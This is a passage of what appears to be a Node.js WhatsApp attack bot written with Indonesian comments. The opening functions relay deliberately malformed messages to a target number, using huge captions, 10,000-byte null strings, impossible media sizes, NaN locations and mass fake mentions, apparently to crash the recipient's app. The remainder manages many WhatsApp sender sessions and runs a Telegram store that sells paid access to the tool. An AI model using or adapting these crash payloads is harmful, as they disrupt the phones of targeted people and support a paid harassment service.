        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBQACBAYBAQEBAQEBAAAAAAAAAAAAAAACAwABBP/aAAwDAQACEAMQAAAAENmvlStHJb7mSvlY4Rb0vN1q2wkoZt1ei+ppWOV/n5vTuc1Djuu01bHPiBts8wniOg88secrtXb+oEOGoH7YOPVe1rFcnskW0+SMCDJ3dNWST//EACkQAAICAgEDAwMFAQAAAAAAAAECAAMREiEEMUETMlEQI3EFFCIkYaH/2gAIAQEAAT8AGRwI9lr/AG0ycwdKQBsss6YooOpltPKlVODKEIuKCNQ6oZs/zL6USstOjJ/cCBy9dbNyd4/IuViMY4iJlKePbKznr2Ms5rP4hXkz9TfWnXyZ0GfXUZhUJRgHz3j7743zOnLiltpQPv5x5h9phq5M68my4L8Sih9sqcGVr1Iwvdcx6AjwOgQCagWgg+Z4mglOtzlj5MfqDS+uoxBaBWDGvDHvLruPdKHJZfzPExKLSoEuxYNvInrMy4/5GeEglcylgtq8fVT7Zk6n8SrILH4mp7mIhawfERv7K4+YOw+gI2EBhVdDgcmMtuvbiCxU8Ss/eU/7F9omYnuE3A7mUWBmwe06h/5ar2gWs8ET0HSxDjjMRTqJ6TT/xAAeEQADAQACAgMAAAAAAAAAAAAAAQIRAyEQEgQxQf/aAAgBAgEBPwCF2aVjTPjqco44TXbwuM/Uxto469dFSWFFT0Ip/Rvt5a1+cP/EABwRAAMAAgMBAAAAAAAAAAAAAAABETFBAhAgIf/aAAgBAwEBPwAzokZw2JVkiJkTgsDaL1w2P4PpOLx//9k=",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true,
          isGroupStatus: true
        },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        scanLengths: [
          999999999999999999,
          888888888888888888,
          777777777777777777,
          666666666666666666
        ],
        midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
      },
      interactiveMessage: {
        title: "x",
        nativeFlowMessage: {
          buttons: [
            {
              name: "review_and_pay",
              buttonParamsJson:
                "{\"currency\":\"IDR\",\"total_amount\":{\"value\":100,\"offset\":100},\"reference_id\":\"" +
                "\0".repeat(10000) +
                "\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":100,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"26802826556025991\",\"product_id\":\"26802826556025991\",\"name\":\"2n!dxlast`\",\"amount\":{\"value\":100,\"offset\":100},\"quantity\":1}]},\"native_payment_methods\":[],\"share_payment_status\":false,\"is_soft_deleted\":false}"
            }
          ]
        },
        contextInfo: {
          mentionedJid: [target],
          isForwarded: true,
          forwardingScore: 99999,
          stanzaId: isTarget,
          participant: "0@s.whatsapp.net",
          remoteJid: "0@s.whatsapp.net",
          quotedMessage: {
            interactiveResponseMessage: {
              body: {
                text: "🧬",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(10000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                version: 3
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(target, msg, {
      messageId:
        "DEX-" +
        Math.random().toString(36).toUpperCase().substring(10),
      participant: { jid: target }
    });
  }
}

async function FcMybe(sock, target) {
    let msg = generateWAMessageFromContent(target, {
        imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc",
            mimetype: "image/jpeg",
            fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
            caption: "X".repeat(999999),
            fileLength: "9999999999999999999",
            height: 999999999,
            width: 999999999,
            mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
            fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
            scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
            contextInfo: { isQuestion: true, isGroupStatus: true }
        }
    });
    
    await sock.relayMessage(target, msg.message, {});
}

async function FcNoClick(sock, target) {
  const p = "ꦽ".repeat(4000);
  const m = {
    viewOnceMessage: {
      message: {
        eventMessage: {
          title: p,
          location: { name: p, degreesLatitude: NaN, degreesLongitude: NaN },
          joinLink: "https://".repeat(200),
          startTime: "0"
        },
        contextInfo: {
          mentionedJid: Array.from({length: 1000}, () => `${Math.floor(Math.random() * 1e10)}@s.whatsapp.net`),
          externalAdReply: { title: p, mediaType: 1, renderLargerThumbnail: true }
        }
      }
    }
  };
  await sock.relayMessage(target, m, { participant: { jid: target } });
}

// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const activeConnections = {};
const biz = {};
const mess = {};

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`;
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }
  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    connectSession(sessionFolder, baseName);
  }
}

async function refreshUserSessions() {
  await startUserSessions();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) { return false; }
  const sessionDir = path.join('permenmd', owner, number); 

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);
      try {
        await waiting(3000);
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds);
          fs.writeFileSync(destCreds, data);
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

// ============================================================
// 🌐 GLOBAL SENDER — Pairing & Session Management (TANPA BATAS)
// ============================================================
async function pairingGlobalWa(number, attempt = 1) {
  // Tidak ada batasan retry, akan terus mencoba sampai berhasil
  const globalFolder = path.join('permenmd', 'global');
  const sessionDir = path.join(globalFolder, number);

  if (!fs.existsSync(globalFolder)) fs.mkdirSync(globalFolder, { recursive: true });
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "open") {
      globalConnections[number] = sock;
      console.log(`[🌐 GLOBAL] Sender ${number} ONLINE`);

      // Update status aktif di JSON
      const senders = loadGlobalSenders();
      const idx = senders.findIndex(s => s.number === number);
      if (idx !== -1) {
        senders[idx].active = true;
        saveGlobalSenders(senders);
      }

    } else if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;
      delete globalConnections[number];
      console.log(`[🌐 GLOBAL] Sender ${number} OFFLINE (${statusCode})`);

      if (isLoggedOut) {
        // Hapus dari list jika logout
        const senders = loadGlobalSenders().filter(s => s.number !== number);
        saveGlobalSenders(senders);
        console.log(`[🌐 GLOBAL] Sender ${number} dihapus karena logout.`);
      } else {
        // Reconnect terus menerus tanpa batas
        console.log(`[🌐 GLOBAL] Reconnecting ${number} attempt ${attempt + 1}...`);
        await waiting(5000);
        await pairingGlobalWa(number, attempt + 1);
      }
    }
  });

  return sock;
}

// Start semua global sender yang sudah tersimpan
async function startGlobalSessions() {
  const globalFolder = path.join('permenmd', 'global');
  if (!fs.existsSync(globalFolder)) {
    fs.mkdirSync(globalFolder, { recursive: true });
    console.log('[🌐 GLOBAL] Folder global dibuat, belum ada sender.');
    return;
  }

  const subdirs = fs.readdirSync(globalFolder).filter(f => {
    try { return fs.lstatSync(path.join(globalFolder, f)).isDirectory(); }
    catch { return false; }
  });

  console.log(`[🌐 GLOBAL] Ditemukan ${subdirs.length} global sender tersimpan.`);

  for (const number of subdirs) {
    if (!globalConnections[number]) {
      console.log(`[🌐 GLOBAL] Starting global sender: ${number}`);
      await pairingGlobalWa(number);
    }
  }
}
// ============================================================

async function startUserSessions() {
  const subfolders = fs.readdirSync('permenmd')
    .filter(name => name !== 'global') // skip folder global
    .map(name => path.join('permenmd', name))
    .filter(p => {
      try { return fs.lstatSync(p).isDirectory(); }
      catch { return false; }
    });

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

    for (const jsonFile of jsonFiles) {
      const sessionName = `${path.basename(jsonFile, ".json")}`;

      if (activeConnections[sessionName]) {
        console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
        continue;
      }

      try {
        console.log(`[START] Connecting session: ${sessionName}`);
        await connectSession(folder, sessionName);
      } catch (err) {
        console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
      }
    }
  }
}

function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName];
    }
  }
  return null;
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, { responseType: 'arraybuffer' });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ============================================================
// 🛒 STORE SYSTEM (QRIS & AUTOMATION)
// ============================================================

const STORE_CONFIG = {
    // Konfigurasi Toko (Sesuaikan dengan gambar)
    currency: "Rp",
    expirationMinutes: 5, // Batas waktu pembayaran
    qrisImageUrl: "https://files.catbox.moe/7oto0q.jpg", // Gambar QRIS Anda (Ganti dengan link asli jika ada)
    adminPaymentCheck: true, // Jika true, pembayaran dicek manual. Jika false, otomatis validasi kode unik.
    
    // Harga Paket
    packages: {
        "member": { price: 15000, name: "Member", role: "member", days: 7 }, // Contoh harga
        "vip": { price: 50000, name: "VIP", role: "vip", days: 30 },
        "reseller": { price: 100000, name: "Reseller", role: "reseller", days: 30 },
        "owner": { price: 600000, name: "RDVSP Owner", role: "owner", days: 365, description: "Kontrol penuh & keuntungan max" }
    }
};

// Menyimpan transaksi sementara
let activeTransactions = {}; // { invoiceId: { userId, package, amount, uniqueCode, createdAt } }

// Helper: Format Rupiah
const formatRupiah = (number) => {
    return new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR' }).format(number);
};

// Helper: Generate Invoice ID
const generateInvoiceId = () => `INV-${Date.now()}-${Math.floor(Math.random() * 1000)}`;

// Helper: Generate Unique Code (3 digit random)
const generateUniqueCode = () => Math.floor(100 + Math.random() * 900);

// 1. Command /store (Menu Utama)
bot.onText(/^\/?(store|beli|menu)/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username || msg.from.first_name;
    
    // Buat tombol inline keyboard untuk setiap paket
    const keyboard = Object.keys(STORE_CONFIG.packages).map(pkgKey => {
        const pkg = STORE_CONFIG.packages[pkgKey];
        const priceLabel = formatRupiah(pkg.price);
        const label = `🛒 ${pkg.name}\n💰 ${priceLabel}`;
        
        // Jika ada khusus (seperti Owner di gambar), beri emoji khusus
        const icon = pkg.role === 'owner' ? '👑' : (pkg.role === 'vip' ? '💎' : '📝');
        
        return [{ text: `${icon} ${pkg.name} - ${priceLabel}`, callback_data: `buy_${pkgKey}` }];
    });

    bot.sendMessage(chatId, 
`*Selamat Datang di Store!* 🛍️

Silakan pilih paket yang ingin Anda beli.

⏰ Pembayaran hanya valid selama *${STORE_CONFIG.expirationMinutes} menit*.
📸 Pembayaran via *QRIS*.
✍️ Setelah bayar, kirim *bukti transfer* di chat ini.

_Pilih paket di bawah ini:_`, 
    {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard }
    });
});

// 2. Handler Callback Query (User klik paket)
bot.on('callback_query', async (query) => {
    const data = query.data;
    const chatId = query.message?.chat?.id;
    const userId = query.from.id;

    // Cek jika aksi beli paket
    if (data.startsWith('buy_')) {
        const packageKey = data.replace('buy_', '');
        const pkg = STORE_CONFIG.packages[packageKey];

        if (!pkg) return bot.answerCallbackQuery(query.id, { text: "Paket tidak ditemukan." });

        // Generate Data Transaksi
        const invoiceId = generateInvoiceId();
        const uniqueCode = generateUniqueCode();
        const totalAmount = pkg.price + uniqueCode;
        const expiryTime = new Date(Date.now() + STORE_CONFIG.expirationMinutes * 60000);

        // Simpan ke memori
        activeTransactions[invoiceId] = {
            userId: userId,
            username: query.from.username,
            packageKey: packageKey,
            amount: totalAmount,
            uniqueCode: uniqueCode,
            createdAt: Date.now(),
            expiryTime: expiryTime.getTime(),
            status: 'pending'
        };

        // Format waktu expiry
        const timeString = expiryTime.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });

        // Pesan Instruksi Pembayaran
        const message = `
*🧾 INVOICE BARU*
ID: \`${invoiceId}\`
Item: *${pkg.name}*
Role: ${pkg.role.toUpperCase()}
Durasi: ${pkg.days} Hari

----------------------------
*💳 DETAIL PEMBAYARAN*
Total Bayar: *${formatRupiah(totalAmount)}*
( Harga Dasar: ${formatRupiah(pkg.price)} + Kode Unik: *${uniqueCode}* )

⏰ Berlaku sampai: *${timeString}*

----------------------------
*📲 CARA BAYAR:*
1. Scan QRIS di bawah ini.
2. Transfer sesuai jumlah *Total Bayar* di atas (Penting! sertakan 3 digit terakhir).
3. Simpan bukti transfer.
4. *Kirim foto bukti transfer ke chat ini* untuk verifikasi otomatis.

_Jika saldo tidak sesuai, pembayaran gagal._
        `;

        // Kirim Pesan + Gambar QRIS
        try {
            // Mengirim gambar QRIS (gunakan file lokal atau URL)
            // Disini saya gunakan URL dummy sebagai placeholder jika file tidak ada
            await bot.sendPhoto(chatId, STORE_CONFIG.qrisImageUrl || "https://picsum.photos/seed/qris/300/300", {
                caption: message,
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "✅ Sudah Bayar (Upload Bukti)", callback_data: `proof_${invoiceId}` }],
                        [{ text: "❌ Batal", callback_data: `cancel_${invoiceId}` }]
                    ]
                }
            });
        } catch (err) {
            console.error("Gagal kirim gambar QRIS:", err);
            bot.sendMessage(chatId, message + "\n\n(Gambar QRIS gagal dimuat, hubungi admin.)", { parse_mode: "Markdown" });
        }

        bot.answerCallbackQuery(query.id);
    } 
    
    // Handler Tombol "Sudah Bayar"
    else if (data.startsWith('proof_')) {
        const invoiceId = data.replace('proof_', '');
        const trans = activeTransactions[invoiceId];

        if (!trans || trans.userId !== userId) {
            return bot.answerCallbackQuery(query.id, { text: "Invoice tidak ditemukan atau kadaluarsa." });
        }

        bot.answerCallbackQuery(query.id);
        bot.sendMessage(chatId, "📸 Silakan upload foto bukti transfer (screenshot) sekarang.\n\n*Sistem akan otomatis mendeteksi angka unik pada bukti Anda.*");
    }

    // Handler Tombol Batal
    else if (data.startsWith('cancel_')) {
        const invoiceId = data.replace('cancel_', '');
        const trans = activeTransactions[invoiceId];
        
        if (trans && trans.userId === userId) {
            delete activeTransactions[invoiceId];
        }
        
        bot.answerCallbackQuery(query.id);
        bot.sendMessage(chatId, "❌ Transaksi dibatalkan.");
    }
});

// 3. Handler Verifikasi Bukti Transfer (Photo Handler)
bot.on('photo', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Cari transaksi pending user ini
    let activeInvoiceId = null;
    let transactionData = null;

    for (const invId in activeTransactions) {
        if (activeTransactions[invId].userId === userId && activeTransactions[invId].status === 'pending') {
            activeInvoiceId = invId;
            transactionData = activeTransactions[invId];
            break;
        }
    }

    // Jika tidak ada transaksi aktif
    if (!activeInvoiceId) {
        return; // Abaikan foto jika tidak sedang checkout
    }

    // Cek Expired
    if (Date.now() > transactionData.expiryTime) {
        delete activeTransactions[activeInvoiceId];
        return bot.sendMessage(chatId, "⏰ Waktu pembayaran invoice Anda telah habis. Silakan buat transaksi baru (/store).");
    }

    // Simulasikan Verifikasi (Karena kita tidak punya OCR bank nyata di sini)
    // Di sistem nyata, Anda akan menggunakan API OCR (seperti Google Vision API) untuk membaca teks di foto.
    // Untuk script ini, kita memverifikasi jika User membalas dengan Angka Unik yang benar, 
    // ATAU kita bisa set ke "Pending Manual" jika ingin admin yang cek manual.
    
    bot.sendMessage(chatId, "🔍 *Menganalisis Bukti Transfer...*\n\nMohon tunggu sebentar, sistem sedang memvalidasi kode unik pembayaran Anda.");

    // Simulasi Loading 2 detik
    setTimeout(async () => {
        // LOGIKA VERIFIKASI OTOMATIS (SIMULASI / MANUAL)
        // Karena script ini berjalan di server tanpa akses OCR Bank berbayar,
        // kita akan meminta user memasukkan nominal yang ditransfer untuk keamanan,
        // ATAU jika Anda ingin mem-bypass manual, Anda bisa buat tombol "Setujui Manual" untuk Admin.

        // Disini kita implementasikan: User diminta membalas Nominal untuk konfirmasi cepat
        bot.sendMessage(chatId, 
`❓ *Konfirmasi Nominal*

Agar verifikasi akurat, mohon balas chat ini dengan nominal yang Anda transfer (Contoh: *15053*).

_Jika nominal sesuai dengan invoice, akun akan langsung dibuat._`, 
        { parse_mode: "Markdown" });

        // Listener sederhana untuk menangkap balasan nominal
        // Catatan: Dalam produksi, gunakan state management yang lebih baik.
        let awaitingReply = true;

        const nominalListener = async (msgReply) => {
            if (!awaitingReply || msgReply.chat.id !== chatId || msgReply.from.id !== userId) return;

            const inputAmount = parseInt(msgReply.text.replace(/\D/g, '')); // Hapus non-angka

            if (inputAmount === transactionData.amount) {
                // SUKSES VERIFIKASI
                awaitingReply = false;
                bot.removeListener('message', nominalListener);
                await processSuccessPayment(chatId, userId, activeInvoiceId, transactionData);
            } else {
                bot.sendMessage(chatId, `❌ Nomor tidak cocok.\nAnda memasukkan: ${formatRupiah(inputAmount)}\nSeharusnya: *${formatRupiah(transactionData.amount)}*`, { parse_mode: "Markdown" });
            }
        };

        // Temporary listener (sebaiknya gunakan library session management seperti telegraf-session)
        bot.on('message', nominalListener);

    }, 2000);
});

// Fungsi Proses Pembayaran Sukses
async function processSuccessPayment(chatId, userId, invoiceId, transactionData) {
    try {
        // Update status transaksi
        transactionData.status = 'paid';
        delete activeTransactions[invoiceId]; // Hapus dari pending list

        // Generate User Data
        const pkg = STORE_CONFIG.packages[transactionData.packageKey];
        const db = loadDatabase();
        
        // Cek jika username belum ada, gunakan telegram username atau generate random
        const baseUsername = transactionData.username || `user${userId}`;
        const finalUsername = db.find(u => u.username === baseUsername) 
            ? `${baseUsername}${Math.floor(Math.random() * 1000)}` 
            : baseUsername;
        
        const randomPassword = Math.random().toString(36).slice(-8); // Generate pass random 8 char
        const expiredDate = new Date();
        expiredDate.setDate(expiredDate.getDate() + pkg.days);

        const newUser = {
            username: finalUsername,
            password: randomPassword,
            role: pkg.role,
            expiredDate: expiredDate.toISOString().split("T")[0]
        };

        // Simpan ke Database
        db.push(newUser);
        saveDatabase(db);

        // Kirim Pesan Sukses ke User
        await bot.sendMessage(chatId, 
`✅ *PEMBAYARAN BERHASIL!*

Terima kasih telah membeli paket *${pkg.name}*.

Berikut adalah detail akun Anda:
👤 *Username:* \`${finalUsername}\`
🔑 *Password:* \`${randomPassword}\`
⏳ *Expired:* ${newUser.expiredDate}
👑 *Role:* ${pkg.role.toUpperCase()}

_Silakan login di APK dengan akun di atas._

*Simpan pesan ini dengan baik!_`, 
        { parse_mode: "Markdown" });

        // Kirim notifikasi ke Grup Utama
        sendToGroupsUtama(
`🛒 *Laporan Store Baru*
👤 User: @${transactionData.username || userId}
📦 Paket: ${pkg.name}
💰 Total: ${formatRupiah(transactionData.amount)}
✅ Status: LUNAS & AKUN DIBUAT`, 
        { parse_mode: "Markdown" }
        );

    } catch (error) {
        console.error("Error saat memproses pembayaran:", error);
        bot.sendMessage(chatId, "⚠️ Terjadi kesalahan sistem saat membuat akun. Silakan hubungi admin.");
    }
}

// ============================================================
// Telegram Command Handlers (Existing)
// ============================================================

// ============================================================
// 📋 /start atau /menu — Dengan tombol Add Sender Global
// ============================================================
bot.onText(/^\/?(?:start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.sendMessage(id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

  // Hitung global sender aktif
  const activeGs = countActiveGlobalSenders();
  const totalGs = loadGlobalSenders().length;

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
        ...(isOwner ? [
          [{ text: `🌐 Add Sender Global (${activeGs}/${totalGs} aktif)`, callback_data: "add_global_sender" }],
          [{ text: "🗑 Hapus Sender Global", callback_data: "remove_global_sender" }],
          [
            { text: "📋 List User", callback_data: "list_user" },
            { text: "🎛 Buat Custom User", callback_data: "create_custom" },
            { text: "🗑 Hapus User", callback_data: "delete_user" }
          ]
        ] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:\n\n🌐 *Global Sender:* ${activeGs}/${totalGs} aktif\n\n*Catatan:* Tidak ada batasan jumlah global sender, kamu bisa menambah sebanyak yang kamu mau!`, { ...options, parse_mode: "Markdown" });
});
// ============================================================

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
